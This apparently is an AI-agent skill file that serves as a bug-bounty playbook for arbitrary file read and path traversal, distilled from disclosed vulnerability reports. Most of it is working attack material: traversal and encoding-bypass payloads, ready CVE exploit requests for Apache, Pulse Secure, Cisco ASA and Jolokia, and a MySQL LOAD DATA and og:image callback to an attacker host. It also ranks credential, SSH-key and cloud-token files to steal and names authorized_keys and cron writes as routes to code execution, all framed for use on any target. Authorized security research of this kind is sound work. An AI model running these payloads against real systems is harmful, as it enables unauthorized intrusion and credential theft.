---
name: hunt-file-reading
description: Hunting skill for LOCAL FILE READ / arbitrary file read / file disclosure. Built from a comprehensive study pack of 412 assigned reports (357 full disclosed-report texts actually mined) across path traversal / LFI (215 signals), search-filter-sort (+119), JS source review (+92), image processing (+81), internal-network (+77), server-side rendering (+68), dependency confusion (+65), comment injection (+58), public code search (+52), admin-internal (+52), API endpoints (+51), filter bypass (+44), plus proxy/cache/xml/url-fetching/import/metadata chains. Covers symlink escapes, ZIP-slip/tar-symlink, archive/image/FFmpeg coder reads, MySQL LOAD DATA LOCAL INFILE, renderer/inclusion chains, full path disclosure as reconnaissance, and the discipline that separates a real file read from an echoed path or a WAF block page. Use when hunting arbitrary file read / path traversal / file disclosure on any target.
sources: hackerone_public, internet_bug_bounty, portswigger_research, public_code_search, synacktiv_research
report_count: 412
full_reports_read: 357
---

# HUNT-FILE-READING — Local File Read / Arbitrary File Read / File Disclosure

This skill is grounded in 357 full disclosed-report texts from a 412-report
study pack. The frequency table from those reports is the hunting compass:

- path traversal / LFI — 215 reports
- search / filter / sort — 119
- JS source review — 92
- image processing — 81
- internal-network — 77
- server-side rendering — 68
- dependency confusion — 65
- comment injection — 58
- public code search — 52
- admin-internal — 52
- API endpoints — 51
- filter bypass — 44

Investigate in that order of expected yield. But read the Gate 0 section first:
most "file read" reports that fail triage fail because the researcher showed an
echoed path or a changed status code, not actual file contents. A real read shows bytes.

---

## Crown Jewel Targets

A file-read primitive is highest-value when the readable bytes convert directly into
a bigger compromise. Rank targets by what the leaked content unlocks:

- **Credential / secret stores** — `.env`, `wp-config.php`, `config.php`,
  `application.properties`, `database.yml`, `.git/config`, `~/.aws/credentials`,
  `~/.docker/config.json`, `/run/secrets/*`, Kubernetes service-account tokens.
  A read here is High→Critical: DB creds, API keys, cloud keys, `secret_key_base`.

- **System & runtime files that enable RCE** — `/etc/passwd` (always probe for the
  literal `root:x:0:0:` line), `/etc/shadow`, `/etc/crontab`, `/var/spool/cron/*`,
  `~/.ssh/id_rsa`, `authorized_keys`. The GitLab package-registry traversal wrote
  `authorized_keys` and turned a path primitive into an SSH shell (#733072).

- **Session / state stores** — PHP session files (`sess_<PHPSESSID>`), Express/Node
  session stores, Flask signed-cookie secrets (`SECRET_KEY`). Reading these enables
  session forgery and account takeover; the cookie+path-traversal case on
  app.starbucks.com (#876295) shows the pattern.

- **Inline credential databases / dumps** — Pulse Secure `data.mdb` LMDB files that
  hold cleartext usernames/passwords (#671749); InfluxDB heap/stack dumps
  (#1643962); exposed `debug.log` files that leak full paths and internals
  (#3002345, #2778441, #1767439).

- **Source code itself** — CGI/source disclosure (#211418, #902322), `php://filter`
  base64 source reads, git metadata, `composer.json` / `vendor/`. Source reads reveal
  new sinks and hardcoded secrets. The h1-5411 CTF chain went LFI → serialization →
  XXE/SSRF (#415233).

- **Container / build-system escape primitives** — symlinks that a privileged host
  process follows back into the host filesystem. The Semmle/LGTM reports (#697055,
  #694181) used a symlinked `lgtm.yml` / `build.log` to make the host copy the host's
  own `/etc/passwd` out of the container.

- **Archive, restore, and import surfaces** — backup restore with tar symlinks
  (#213558), ZIP extraction (#205481, #765291), NuGet/Maven metadata fields embedded
  into filenames (#822262), XML import fields switched from `file` to `url` (#8013),
  UniFi config restore (#329770).

- **Media / rendering pipelines** — FFmpeg HLS + GAB2 subtitle chunks that read
  conversion-node local files and fire SSRF (#237381); Confluence `file://` template
  macro (#538771); PDF-export HTML injection that becomes LFI (#809819); an emblem
  editor that rendered server text files onto an image (#347139); a `markdown-pdf`
  local file read (#360727).

- **Cloud / ingress control planes** — ingress-nginx annotation path injection reading
  the service-account token (#2701701, #1382919); ActiveStorage blob `key:` injection
  into disk paths (#3580511, #2334455).

**Payout calibration from the corpus:**

- Critical bounties cluster around traversal→RCE: GitLab $12,000 (#733072, #822262),
  Apache CVE-2021-41773/42013 $4,000/$1,000, Uber SSL VPN $6,500 (#617543),
  Mozilla VPN $6,000 (#2995025), Keybase $5,000 (#713006).
- Pure path disclosure / full-path-error findings are typically Low/Informational
  ($0). Use them as reconnaissance to build a real read, not as the final report.
- OWASP/CWE mapping: the dominant weakness is Path Traversal (CWE-22), followed by
  Information Exposure Through an Error Message (CWE-209) and Improper Input
  Validation (CWE-20); symlink cases are CWE-59 (Link Following).

---

## Attack Surface Signals

### URL / Body Parameters to Hunt

```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=  ?include=
?doc=  ?load=  ?read=  ?content=  ?download=  ?img=  ?pdf=  ?report=
?dir=  ?src=  ?source=  ?filename=  ?filePathDownload=  ?key=
?color_scheme=  ?_template=  ?layout=  ?component=  ?style=  ?name=
JSON bodies:   {"filename":...} {"template":...} {"path":...} {"key":...}
XML fields:    <id>  <version>  <file>  <url>  (metadata -> filename pipelines)
```

The DoD `download.php` case used `?filePathDownload=data_products/.../../../etc/passwd`
(#1639364); the GSA LFI used `?page=..%2fREADME` appended into `file_get_contents`
(#895972); Acronis used `?color_scheme=%2F..%2F..%2FPARAMETER` (#1245165).

### Non-parameter file-read surfaces (high-yield, often missed)

```
Static file servers / CDN aliases:
  /static/  /public/plugins/  /assets/  /public/
  nginx alias misconfig -> /static/../../etc/passwd  (#455858, #446330, #312510)

Archive extraction:
  unzip / untar / "Extract here" / backup restore / package upload
  (#205481, #765291, #213558, #329770, #859469, #284346)

Image / media processing:
  avatar, thumbnail, image alt attribute, MSL/MVG coders,
  FFmpeg HLS / GAB2 subtitle chunks (#237381, #998264, #1858574)

Download endpoints / Content-Disposition:
  curl -O -J filename parsing (#3408126), node-downloader-helper (#772509)

Search / filter / sort:
  params that feed a filename, path, or template name
  (#316713 ad builder, #1196917 saveContracts.js)

Import features:
  XML/CSV import, "import from URL" (#8013, #341992, #8091)

Management / Jolokia endpoints:
  path segment before each directory as `!` (#2778380, #1641661)
```

### Technology / Stack Signals

| Signal | Vector / What it implies |
|--------|--------------------------|
| PHP (`X-Powered-By`, `PHPSESSID`, `.php`) | `php://filter` base64 source read; filter-chain RCE; log/session poison; `file://` template include; full path disclosure via warnings (#8013) |
| Apache 2.4.49 / 2.4.50 banner | CVE-2021-41773 / CVE-2021-42013 path traversal → RCE (#1394916, #1400238, #1404731); mod_rewrite CVE-2024-38475 (#2585378) |
| Cisco ASA / FTD | CVE-2018-0296 (#2375666, #695429), CVE-2020-3452 read-only traversal (#962908) — hunt every ASA instance |
| Pulse Secure SSL VPN | CVE-2019-11510 pre-auth arbitrary read → LMDB creds → RCE (#695005, #671749, #696276) |
| Node.js / Express static servers | traversal in `res.sendFile` / `express.static`; dozens of npm static-server modules; Buffer/permission-model bypasses (#2434811, #2225660, #3255707) |
| Java servlet / Spring / Tomcat | `WEB-INF/web.xml`, `application.properties`; view-resolver traversal (#3370); JFinal file-path injection (#1483918) |
| Ruby on Rails / ActiveStorage | Disk-service `key:` traversal (#3580511, #2334455); `actionpack-page_caching` (#519220) |
| Python Flask / Django | `settings.py`, `SECRET_KEY`, path-sink injection (#1413541, #1471622) |
| Nginx `alias` / reverse proxy / ProxyPass | alias traversal (#455858); `..;/` AJP traversal in Trellix ESM (#2817658); Shopify app-proxy escape (#869888) |
| Kubernetes / ingress-nginx | annotation-driven arbitrary file read of SA token (#2701701, #1382919) |
| File-upload / archive features | ZIP-slip, tar-symlink, dependency-confusion packages (#530289, #411405) |
| Confluence / Atlassian | `file://` template macro CVE-2019-3396 (#538771, #536130) |

### JS / Client-Side Patterns (in bundles and source maps)

```javascript
// Patterns that reveal a file-read / download sink
fetch('/api/download?file=' + userInput)
axios.get('/api/file', { params: { path: state.filename } })
res.sendFile(req.query.path)            // Express static file serve
res.sendFile(path.join(base, req.params.file))
const p = path.join(__dirname, 'uploads', name)   // path.join traversal (#3255707)
src: params.source                       // URL/path fed to a renderer
url: req.body.url                        // fetcher that may accept file:// (#1189367)
color_scheme GET param concatenated into a CSS URL (#1245165)
key: userSupplied                        // ActiveStorage DiskService (#3580511)
```

When you find one of these, trace the value server-side: is it normalized, is a
base directory prepended, and is an extension appended? Those three questions decide
which bypass from the Bypass Techniques table applies.

### Common Tool / Recon Signatures in the Corpus

```
gf lfi / ffuf with an LFI wordlist over the candidate param
Acunetix / IronWasp HTTP request function surfaced static-file traversal (#229622)
curl --path-as-is (needed so curl does not normalize the traversal away, #695005)
Burp Collaborator / interactsh for blind read callbacks (#237381, #719875)
GitHub patch diffs for incomplete CVE fixes (#1353603, #3328367)
```

### Response / Error Signals (reconnaissance, not the finding)

```
Full path disclosure in errors:
  "Warning: ... in /var/www/.../index.php on line 421"  (#8013, #19363, #15899)
  "Notice: Undefined index: importFileXML in /var/www/vhosts/.../index.php on line 421"
  (#8013, #8090, #9745, #97319)
Verbose stack traces: libraries, versions, absolute paths (#125197)
Exception after malformed input: array-into-string, SQL syntax, PDOException -> path
  (#19363, #15899)
Development/debug artifacts: debug.log, .git/, composer.json, vendor/
  (#919429, #3002345, #2778441, #1767439)
Full path via forced errors: malformed cookie (#230098), CSRF validation failure
  (#148890), removing CSRF token (#150018), invalid language (#13237)
```

---

## Discovery Patterns From 357 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **URL parameters and crawled request lists** — *what to look for:* any parameter
   that names a file, path, page, template, module, document, image, report, or
   download. grep captured traffic for
   `file|path|page|template|doc|load|read|download|img|pdf|report|dir|include|src|name`.
   The GSA "Limited LFI" came from `$page` concatenated into
   `file_get_contents($docs_path . $page . '.md')` (#895972); the DoD `download.php`
   LFI came from an externally-facing `filePathDownload` value (#1639364).

2. **JS / source bundles and public repositories** — *what to look for:* fetch of
   user-controlled filenames, download handlers, static-resolve logic. The Acronis
   CSS-injection case was found by reading JS that concatenated `color_scheme` into a
   CSS URL (#1245165). The recurring "dig deeper into how static files were served"
   pattern (#820224, #116057) and GitHub patch-diff review found incomplete fixes
   (#1353603, #3328367). One researcher was "combing through your GitHub repository
   to look at the fixes for recent security releases" (#1353603).

3. **Known-CVE fingerprinting of exposed appliances** — *what to look for:* product /
   version banners matching a published traversal. Repeated mass-rediscovery of the
   same CVE across new hosts dominates the corpus:
   - Cisco ASA CVE-2018-0296 (#695429, #694865, #695427, #694861, #378698)
   - Cisco ASA CVE-2020-3452 (#936399, #962908, #960082, #1137321)
   - Pulse Secure CVE-2019-11510 (#695005, #671749, #696276, #671857)

4. **Search / filter / sort / export features** — *what to look for:* parameters that
   build a filename or template server-side. The Semrush "Ad Builder Display Ads Path
   Traversal" full destination path was first identified from error messages during
   testing (#316713).

5. **Image / media / file-processing pipelines** — *what to look for:* avatar upload,
   thumbnail, album title into an `alt` attribute, video subtitle chunks, PDF export.
   Researchers "fired the feature using GAB2 subtitle chunks inside an AVI file" and
   reached conversion-node local files (#237381); PDF-export HTML injection became LFI
   (#809819); an emblem editor rendered server text files (#347139).

6. **Archive, restore, and package registries** — *what to look for:* any upload that is
   unzipped/untarred or whose metadata becomes a path. NuGet `<version>` became
   `../../../../../nyangawa.nupkg` (#822262); backup restore followed a planted symlink
   to `/etc/passwd` (#213558); a Maven path traversal wrote `authorized_keys` (#733072).

7. **Internal / admin-only management interfaces** — *what to look for:* Jolokia,
   actuator, ingress controllers, CI/CD, admin restore. DoD's unauthenticated Jolokia
   LFI used `!` between directory segments (#2778380, #1641661).

8. **Error-message reconnaissance (full path disclosure)** — *what to look for:* trigger
   a warning/exception that prints an absolute path, then use that base to build a
   traversal. Many low-severity FPD reports are the first step, not the destination
   (#8013, #8090, #9745, #19363, #26825, #153628, #145260, #125197).

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Ranked by number of full reports containing the signal (source: study-pack frequency table).

| # | Signal (reports) | Why it matters / what to probe |
|---|------------------|--------------------------------|
| 1 | path-traversal-lfi (215) | The core primitive. Probe `../`, encoded dot/slash, absolute paths, symlinks across every file-naming input. |
| 2 | search-filter-sort (119) | Sorting/filter params often feed filenames or templates. Probe a sort value as a traversal string; watch for reflected filenames. |
| 3 | js-source-review (92) | Client bundles expose the download/resolve sink. Grep for `src`, `file`, `readFile`, `path.join`, relative-URL concatenation. |
| 4 | image-processing (81) | Image/thumbnail/avatar coders read local paths (MSL/MVG, `label:@/etc/passwd`) and fetch remote playlists. Probe filenames, alt/title, coder directives. |
| 5 | internal-network (77) | Traversal often reaches internal file shares, UNC paths, or management endpoints. Probe UNC `\\host\share`, service tokens, metadata-adjacent files. |
| 6 | server-side-rendering (68) | Templates rendered server-side turn injected HTML/`file://` into LFI. Probe template params, macros, `og:image` meta tags (#996899). |
| 7 | dependency-confusion (65) | npm/static-server modules with traversal in path resolution. Probe public module versions, extra leading `/`, symlink (#411405, #530289). |
| 8 | comment-injection (58) | Comments/fields later rendered or included. Probe stored text that lands in a template or file path. |
| 9 | public-code-search (52) | Patches and source reveal incomplete fixes and new sinks. Diff security releases, look for normalization done in the wrong order (#1765631). |
| 10 | admin-internal (52) | Admin restore/config-import and internal panels. Probe tar symlinks, config-upload paths, backup restore (#213558, #329770). |
| 11 | api-endpoint (51) | Registry/package/proxy APIs construct paths from user metadata. Probe URL-encoded segments and `%2e%2e` in API path (#733072, #822262, #134032). |
| 12 | filter-bypass (44) | When `../` is blocked, the bypass is the bug. Probe double encoding, mixed slashes, `..;/`, extra `/`, `!` segment separators, null byte. |
| 13 | cache-layer (38) | Cache keys/uppercase path segments enable path confusion and can expose files. Probe case variation and invalid paths (#960618). |
| 14 | session-attack (36) | Session files and cookie-scoped paths become readable/includable. Probe `PHPSESSID` injection (#230098). |
| 15 | cookie-handling (33) | Cookies feed download paths. Probe cookie manipulation on download endpoints (#876295). |
| 16 | debug-error-leak (33) | Errors print absolute paths → base for traversal. Probe arrays, malformed params, quotes to force warnings (#8013, #19363, #97319). |
| 17 | proxy-feature (31) | Reverse proxies with `ProxyPass`/alias normalize differently. Probe `..;/`, encoded slashes, path prefix escape (#869888, #2817658). |
| 18 | xml-parser (30) | XML metadata fields become filenames or external entities. Probe `<version>` traversal and `file`→`url` field swap (#822262, #8013). |
| 19 | redirect-handling (25) | Redirects bypass a validated path. Probe redirect to `file://` or to an internal path (#996899). |
| 20 | file-upload (24) | Upload name/path becomes a local path. Probe filename traversal (#205481). |
| 21 | url-fetching (24) | A remote-fetch URL becomes a local path. Probe `file://` fetch (#1189367, #3485930). |
| 22 | unicode-normalization (17) | Overlong UTF-8 / percent-decoding order bugs. Probe `%c0%ae`, `%%32%65`, `!!` segment tricks (#1404731, #3255707). |
| 23 | import-feature (14) | XML/CSV import and "import from URL" expose paths (#8013, #341992). |
| 24 | cloud-metadata (12) | Traversal into SA tokens / blob keys. Probe ingress annotations, ActiveStorage `key:` (#2701701, #3580511). |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

These are verbatim "how I found it" lines from the disclosed reports.

1. [#1415820] "I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms."
2. [#519220] "I found a directory traversal in `actionpack-page_caching`."
3. [#237381] "I was able to fire this feature using GAB2 subtitle chunks inside an AVI file."
4. [#237381] "After that, I was able to retrieve conversion nodes' local files and fire SSRF requests."
5. [#719875] "I've found a way to read Infogram's server local files through the MySQL connection."
6. [#3255707] "But then I started testing UNC paths (you know, network paths like `\\server\share`) and found the vulnerability still exists there."
7. [#1245165] "While looking at the HTTP requests to see if I could find any open redirect and demonstrate the impact I notice one interesting API endpoint"
8. [#333306] "I was able to view the internal server files at https://msg.algolia.com."
9. [#671749] "I was able to reproduce this by grabbing in the etc/passswd."
10. [#869888] "I found app proxy is vulnerable to path traversal, the attacker scenario is from anonymous user to oauth app owner."
11. [#229622] "From within the http request function of the Acunetix and IronWasp programs I was able to view the passwd and hosts files at https://nightly.ubnt.com."
12. [#316713] "The full file path of the zip file destination was identified from error messages observed during testing."
13. [#1353603] "I was combing through your GitHub repository to look at the fixes for recent security releases and found the fix for CVE-2021-22151"
14. [#962908] "I discovered a vulnerability Read-only path traversal (CVE-2020-3452) at https://██████████."
15. [#820224] "I started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code."
16. [#8013] "During the import of an XML file, I edited the "file" to "url" for importing XML's through URL."
17. [#347139] "I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem."
18. [#2995025] "When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files."

### Probe Checklist (15 concrete probes)

Run these against every candidate sink found above. Each probe is drawn from a
disclosed report in the corpus.

1. `?file=../../../etc/passwd` — baseline traversal; look for literal `root:x:0:0:` in the body.
2. `?file=....//....//....//etc/passwd` — single `../` strip bypass (re-forms after removal).
3. `?file=..%2f..%2f..%2fetc%2fpasswd` — single URL-encoded slash.
4. `?file=..%252f..%252f..%252fetc%252fpasswd` — double-encoded slash; Algolia used `..%252f` (#333306).
5. `?file=/etc/passwd` — absolute path when no base directory is prepended.
6. `?file=data_products/MISC/frida_cal/../../../../../../etc/passwd` — valid known-good prefix + traversal (required in #1639364).
7. `GET /static/..%252f..%252f..%252f..%252fetc/passwd` — static/alias traversal with double encoding.
8. `curl -i -k --path-as-is https://host/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/` — Pulse Secure normalization abuse (#695005).
9. `GET /apps/ss/b.php/../../?shop=a&Shop=asd` — proxy-path prefix escape (#869888).
10. `.../compilerDirectivesAdd/!/etc!/passwd` — `!` as directory separator on Jolokia (#2778380).
11. `{"contentId":"12345","macro":{"params":{"_template":"file://../"}}}` — server-side `file://` template include (#538771).
12. `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\n"` against an attacker MySQL server (#719875).
13. Plant a tar-symlink `ln -s /etc/passwd uploads/.../x.png`, repackage, restore backup (#213558).
14. Force an error with an array parameter (`filename[]=1`, `phraseKey[]=x`) to leak the absolute base path for a later read (#19363, #97319).
15. `?file=php://filter/convert.base64-encode/resource=index.php` — PHP source read; base64 decode to confirm real PHP (not an echoed path).

### Cross-Cutting Discovery Heuristics

Four heuristics recur across the 357 reports independent of the specific surface:

- **Repeat CVE discovery is a strategy, not luck.** The same handful of appliance
  CVEs (Cisco ASA 2018-0296 / 2020-3452, Pulse Secure 2019-11510, Apache 41773/42013)
  account for dozens of reports. Fingerprint the stack, then test the known payload.
- **Read the patch, then break the patch.** Incomplete fixes are a whole subgenre
  (#1400238, #3328367, #1353603, #2225660, #3255707, #411405). "I was testing the
  recent fix and noticed something" is a reliable lead (#3255707).
- **Trust boundaries are where file reads live.** Build output copied host→container
  (#697055), backup restored by a privileged process (#213558), archive extracted by
  a service account (#765291) — the vulnerable component is the one that follows the
  path/symlink, not the one that creates it.
- **The file you choose determines the severity.** `/etc/passwd` alone is Medium;
  LMDB credential stores, SA tokens, `authorized_keys`, or config secrets turn the
  same primitive Critical. Always ask "what is the most damaging file this sink can
  reach?" before scoring.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Build the candidate list (recon order = frequency order)

```bash
# Extract file-naming parameters from captured traffic / crumbs
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -Ei "(\?|&)(file|path|page|template|view|doc|load|read|download|img|pdf|report|dir|include|src|filename|key|color_scheme)=" \
  recon/$TARGET/urls.txt
# Fingerprint known-traversal appliances
grep -Ei "Apache/2.4.(49|50)|Cisco ASA|Pulse Secure|Grafana|nginx|Jolokia" recon/$TARGET/headers.txt
```

Then manually review JS bundles for `readFile`, `sendFile`, `path.join`, relative URL
concatenation, and download handlers (#820224, #1245165). Check public repos and
security patch diffs for incomplete fixes (#1353603, #3328367).

### Phase 2 — Establish a real file-read primitive (never skip confirmation)

- Pick a unique-marker target: `/etc/passwd` with the literal `root:x:0:0:` line, or a
  known source file you can base64-decode.
- Establish a **baseline** response with a benign value. The delta between benign and
  traversal must be the **file body**, not a WAF page or error string.
- Run the **negative control**: request `/etc/passwd` and `/etc/passwd_<random>` — only
  the real file returns content. This rules out reflection.
- For blind reads, use a callback-out chain: a `php://filter` + injected PHP that calls
  your unique Burp Collaborator subdomain, a MySQL `LOAD DATA LOCAL INFILE` against
  your own server, or an FFmpeg HLS playlist pointing at your host (#237381).

### Phase 3 — Traversal / encoding matrix

Work through the Probe Checklist above systematically:

- If `../` is stripped once, use `....//`.
- If slashes are decoded once, use `%252f`.
- If a fixed base is prepended, add enough `../` or switch to an absolute path.
- If the app appends an extension, use `?`/`#` truncation, a null byte on legacy PHP,
  or a valid-prefix + traversal (#1639364).
- If the path is normalized in the wrong order (validate-then-normalize), reintroduce
  `../` via the normalization step (#1765631).

### Phase 4 — Platform-specific reads

- **PHP:** `php://filter/convert.base64-encode/resource=config.php` for source; then
  consider filter-chain → RCE (see `hunt-lfi`).
- **Windows:** `..\..\..\windows\win.ini`, UNC paths, device names (CON/PRN/AUX —
  #3255707), drive-name traversal (#2307225).
- **Java/servlet:** `WEB-INF/web.xml`, `classes/`, view-resolver `../../` (#3370),
  JFinal file-path injection (#1483918).
- **Node/Express:** static-server module traversal; Buffer/permission-model bypasses
  (#2434811, #2225660), `path.join` UNC device-name escapes (#3255707).
- **Rails:** ActiveStorage Disk `key:` traversal into `/etc/passwd` or writable paths
  (#3580511, #2334455).

### Phase 5 — Non-parameter sinks (the "no ?file= needed" surfaces)

- **ZIP / tar:** craft an entry `../../../etc/cron.d/x` or a symlink to `/etc/passwd`;
  confirm by writing/reading a unique canary outside the extraction dir (#205481,
  #765291, #213558, #329770).
- **Package registries:** inject `../../` into NuGet `<version>` or Maven path
  segments; chain to a race/write for RCE (#822262, #733072).
- **Media coders:** `label:@/etc/passwd`, MSL `<image xlink:href="msl:/etc/passwd">`;
  FFmpeg HLS/GAB2 subtitle chunks (#237381).
- **MySQL clients:** `LOAD DATA LOCAL INFILE` to an attacker server (#719875).
- **Import / URL fetch:** switch a `file` field to `url`, or supply `file:///etc/passwd`
  to a fetcher that decodes it (#8013, #1189367, #3485930).
- **Renderer / meta tag:** inject `<meta property="og:image" content="...">` that
  redirects to a local file, bypassing the filter (#996899).

### Phase 6 — Chain and document

- Read → secret → pivot: config/keys → SSRF/IAM/RCE (see Related Skills & Chains).
- Read → RCE: authorized_keys write, cron write, filter-chain, CVE-2019-11510 chain.
- Capture, for each hop, the request, the returned file body, and a negative control.

---

## Payload & Detection Patterns

### Path traversal (Linux)

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
%c0%ae%c0%ae%2f                        # overlong UTF-8 (legacy servers)
/etc/passwd
/etc/./passwd                          # literal-filter bypass
```

### Path traversal (Windows / UNC)

```bash
..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
\\server\share\..\..\secret.txt        # UNC + device-name escape (#3255707)
C:\inetpub\wwwroot\web.config
```

### Appliance / CVE-specific payloads

```bash
# Apache 2.4.49 / 2.4.50 (CVE-2021-41773 / CVE-2021-42013)
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
GET /icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1

# Pulse Secure CVE-2019-11510
curl -i -k --path-as-is \
  'https://host/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'

# Cisco ASA / FTD CVE-2020-3452 read-only traversal
GET /+CSCOE+/../../../../etc/passwd

# Jolokia path separator
.../jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd

# nginx alias / proxy traversal
GET /static/..%252f..%252f..%252f..%252fetc/passwd
GET /apps/ss/b.php/../../?shop=a
GET /..;/%2e%2e/..;/secret               # `..;/` AJP/proxy normalization (#2817658)

# New Relic / Rails mixed slash + encoding
GET /devops/%5c%2e%2e%2f%5c%2e%2e%2f%5c%2e%2e%2fGemfile HTTP/1.1  (#134032)
```

### PHP source / inclusion reads

```bash
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=config.php
# Always base64-encode source reads; raw <?php ?> is parsed/swallowed.

{"contentId":"12345","macro":{"name":"widget","params":{"_template":"file://../"}}}
```

### Blind / OOB file-read confirmation

```bash
# MySQL LOAD DATA LOCAL against attacker server (#719875)
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\n"

# FFmpeg HLS GAB2 subtitle chunk with external URL (#237381):
# keep binary layout; point embedded http link at your Collaborator, upload AVI,
# edit video -> conversion node fetches your URL and can read local files

# Renderer / meta-tag include to bypass a filter (#996899):
<meta property="og:image" content="http://attacker/redirect-to-file:///etc/passwd">
```

### Detection / triage automation

```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
# Filter responses for the real marker — not a status-code change:
#   grep -q 'root:x:0:0:'  OR  base64 -d | grep -q '<?php'
```

### Sensitive Files to Read (by platform)

Grounded in the files actually requested in the corpus. Prioritize the top group;
the appliance-specific files turn a generic read into a credential/RCE chain.

```
# Linux — universal markers
/etc/passwd                    root:x:0:0:  (the #1 marker in the corpus)
/etc/hosts
/etc/shadow                    rarely readable — try anyway
/etc/crontab  /var/spool/cron/*
/proc/self/environ  /proc/self/cmdline  /proc/self/status

# App / framework secrets
/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
/var/www/html/app/config/parameters.yml       (Symfony)
application.properties  database.yml  settings.py  SECRET_KEY
.git/config  .git/HEAD  composer.json  package.json

# Cloud / container credentials
~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# SSH / history
/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
~/.ssh/authorized_keys   (also a WRITE target -> RCE, #733072)

# Appliance-specific (chain to creds/RCE)
/data/runtime/mtmp/lmdb/dataa/data.mdb     (Pulse Secure cleartext creds, #671749)
/data/runtime/mtmp/system
/var/log/apache2/access.log  /var/log/nginx/access.log  (log poison -> RCE)

# Windows / .NET
C:\Windows\win.ini  ..\..\..\windows\win.ini
C:\inetpub\wwwroot\web.config  ..\..\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

### Grep Patterns for Source-Code Review

```bash
# Find file-read / path construction sinks
grep -rE "(file_get_contents|readFile|sendFile|fopen|open\()\s*\(" --include="*.php" --include="*.js" --include="*.rb"
# Find user input flowing into a path
grep -rE "(file|path|name|key)\s*=\s*req\.(query|body|params)" --include="*.js"
# Find archive extraction / symlink handling
grep -rE "(extract|unzip|untar|symlink|realpath|path\.join)" --include="*.js" --include="*.rb" --include="*.py"
# Find normalization done in the wrong order (validate then normalize)
grep -rE "(normalize|resolve).*(isValid|validate)|(isValid|validate).*(normalize|resolve)"
```

### ffuf / Wordlist-Driven Discovery (then manual-confirm everything)

```bash
# Brute-force the traversal wordlist at one parameter
ffuf -u "https://$TARGET/download?file=FUZZ" -w ~/wordlists/lfi.txt \
  -mc 200 -fr "not found|no such file"
# Brute-force continuous path segments with --path-as-is equivalents
ffuf -u "https://$TARGET/static/FUZZ" -w ~/wordlists/traversal.txt -mc 200
# Then send the exact hit to a real browser/proxy and confirm the file body manually.
```

---

## Common Root Causes

1. **User input concatenated into a filesystem path with no canonicalization check.**
   This is the dominant cause in the corpus. `$docs_path . $page . '.md'` (#895972);
   ActiveStorage `key:` forwarded into `DiskService#path_for` (#3580511); metadata
   `<version>` into a `.nupkg` filename (#822262); `filePathDownload` into a download
   path (#1639364).

2. **Normalization / validation done in the wrong order.** Validate first, normalize
   later; normalization reintroduces `../`. Nextcloud `getFullPath()` (#1765631) and
   the Node.js device-name UNC case (#3255707) are canonical examples; the Node
   permission model called `path.resolve()` on user paths but mishandled Buffers
   (#2434811, #2225660).

3. **Symlinks trusted across a trust boundary.** A low-privileged build/upload process
   plants a symlink; a privileged host/restore process follows it (#697055, #694181,
   #213558, #530289, #593911).

4. **Archive extraction without entry-name/symlink checks.** ZIP-slip and tar-symlink
   escape (#205481, #765291, #329770, #859469, #284346, #772509).

5. **Incomplete CVE patches.** Patched once, rediscovered with a new encoding or path
   shape: #1400238 after #1394916; #3328367 after CVE-2021-3281; #1353603 after
   CVE-2021-22151; #2225660 after CVE-2023-30584; #411405 after #384939.

6. **Server-side renderers / coders that resolve external or local references.**
   FFmpeg HLS, PDF export, Confluence `file://` macro, emblem rendering (#237381,
   #809819, #538771, #347139, #360727).

7. **Reverse-proxy / alias path confusion.** Front-end and origin normalize `../`,
   `..;/`, or encoded slashes differently (#869888, #2817658, #455858, #446330).

8. **Verbose errors that disclose the absolute base path.** Full path disclosure is
   the reconnaissance that makes a relative traversal reliable (#8013, #19363,
   #97319, #125197, #8090, #9745).

9. **Client-side path / URL concatenation.** Unfiltered `.` and `/` in a GET parameter
   flow into a CSS/asset URL (#1245165), or a download path is derived from a cookie
   (#876295) or a path parameter used in a management command (#2778380).

---

## Bypass Techniques

| Blocked thing | Bypass (grounded in corpus) |
|---------------|-----------------------------|
| `../` stripped once | `....//` / `..../\` — re-forms after the strip |
| `/` URL-decoded once | `%252f`; dots encoded `%2e%2e` |
| Blocked literal `/etc/passwd` | `/etc/./passwd`; `/etc//passwd`; valid-prefix + traversal (#1639364) |
| Extra leading `/` needed | `//../../../../etc/passwd` (http-live-simulator bypass, #411405) |
| Path-normalization filter | `..;/` matrix segment (#2817658); `!` separator (#2778380) |
| Double-encoded traversal | `%%32%65`, `.%%32%65`, `.%2%65` (Apache 2.4.50, #1404731) |
| Overlong UTF-8 | `%c0%ae%c0%ae%2f` on legacy decoders |
| Windows device names | `CON:`/`PRN:` in UNC `path.join()` (#3255707); drive-name traversal (#2307225) |
